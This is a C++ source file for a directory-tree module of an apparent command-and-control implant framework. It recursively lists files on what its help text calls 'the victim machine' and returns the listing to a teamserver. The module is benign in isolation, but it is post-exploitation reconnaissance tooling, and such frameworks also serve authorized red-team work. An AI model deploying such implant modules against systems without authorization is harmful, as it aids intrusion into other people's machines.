#include "Tree.hpp"

#include <cstring>
#include <array>
#include <filesystem>
#include <sstream>

#include "Common.hpp"


using namespace std;


constexpr std::string_view moduleName = "tree";
constexpr unsigned long long moduleHash = djb2(moduleName);

namespace
{
    constexpr int ERROR_TREE_DIRECTORY = 1;
}


#ifdef _WIN32

__declspec(dllexport) Tree* TreeConstructor() 
{
    return new Tree();
}

#else

__attribute__((visibility("default"))) Tree * TreeConstructor()
{
    return new Tree();
}

#endif


Tree::Tree()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

Tree::~Tree()
{
}

std::string Tree::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "Tree Module:\n";
    info += "Recursively list the directory structure of a given path on the victim machine.\n";
    info += "Displays files and folders in a tree-like format.\n";
    info += "\nExamples:\n";
    info += "- tree /tmp\n";
    info += "- tree C:\\Users\\Public\n";
#endif
    return info;
}

int Tree::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) 
    if (splitedCmd.empty())
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    string path;
    for (int idx = 1; idx < splitedCmd.size(); idx++) 
    {
        if(!path.empty())
            path+=" ";
        path+=splitedCmd[idx];
    }

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(path);
#endif

    return 0;
}

int Tree::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    string path = c2Message.cmd();
    std::string outCmd;
    const bool listed = iterProcess(path, 0, outCmd);

    c2RetMessage.set_instruction(c2RetMessage.instruction());
    c2RetMessage.set_cmd(path);
    c2RetMessage.set_errorCode(listed ? 0 : ERROR_TREE_DIRECTORY);
    c2RetMessage.set_returnvalue(outCmd);

    return 0;
}

int Tree::errorCodeToMsg(const C2Message &c2RetMessage, std::string &errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
    if (c2RetMessage.errorCode() == ERROR_TREE_DIRECTORY)
    {
        errorMsg = "Failed: Couldn't list directory";
        if (!c2RetMessage.returnvalue().empty())
            errorMsg += "\n" + c2RetMessage.returnvalue();
    }
#endif
    return 0;
}


bool Tree::iterProcess(const std::string& path, int depth, std::string& result)
{
    if(depth>=4)
        return true;

    try
    {
        std::string actualPath=path;
        if(actualPath.empty())
            actualPath=std::filesystem::current_path().string();

        std::error_code e;
        const auto entries = std::filesystem::directory_iterator(actualPath, e);
        if (e)
        {
            result += "Error: ";
            result += e == std::errc::no_such_file_or_directory ? "path does not exist" : e.message();
            result += "\n";
            return false;
        }

        for (const filesystem::directory_entry& file : entries)
        {
            try
            {
                filesystem::file_status status = filesystem::status(file.path().string(), e);

                for(int i=0; i<depth; i++)
                    result += "    ";

                if(status.type()==filesystem::file_type::directory)
                {
                    result += file.path().string();
                    result += "\\";
                    result += "\n";

                    iterProcess(file.path().string(), depth+1, result);
                }
                else
                {
                    result += file.path().string();
                    result += "\n";
                }

                }
                catch (...)
                {
                    // result += file.path().string();
                    // result += "\n";
                }
        }
    }
    catch (const std::exception &exc)
    {
        result += "Error: ";
        result += exc.what();
        result += "\n";
        return false;
    }

    return true;
}
